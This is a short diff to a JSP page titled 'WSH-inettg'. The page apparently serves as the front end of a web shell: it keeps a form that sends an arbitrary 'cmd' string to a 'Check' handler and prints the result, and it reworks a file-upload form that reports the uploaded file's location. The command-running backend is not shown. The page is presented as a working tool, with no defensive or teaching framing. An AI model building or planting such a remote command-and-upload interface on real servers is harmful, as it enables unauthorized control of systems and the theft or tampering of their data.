@@ -8,7 +8,7 @@
 <head>
 <meta charset="UTF-8">
 <link rel="stylesheet" href="css/style.css">
-<title>RRA</title>
+<title>WSH-inettg</title>
 </head>
 <body>
 	<table id="infoTable">
@@ -33,15 +33,23 @@
 	<FORM METHOD=GET ACTION='Check'>
 		<INPUT name='cmd' type=text> <INPUT type=submit value='Run'>
 	</FORM>
-
-	<form action="upload" method="post" enctype="multipart/form-data">
-		<input type="file" name="file" /> 
-		<input type="submit" name = "Upload" />
-	</form>
-
 	<pre>
 		<c:out value="${cmd}"></c:out>
 	</pre>
+
+	<h3>Upload</h3>
+	<form action="Upload" method="post" enctype="multipart/form-data">
+		<input type="file" name="file" /> <br> <input type="submit"
+			value="Upload" />
+	</form>
+	<pre>
+		<c:if test="${url!=null}">
+			<c:out value="File uploaded here: ${url}"></c:out>
+		</c:if>
+		
+	</pre>
+
+
 
 
 </body>
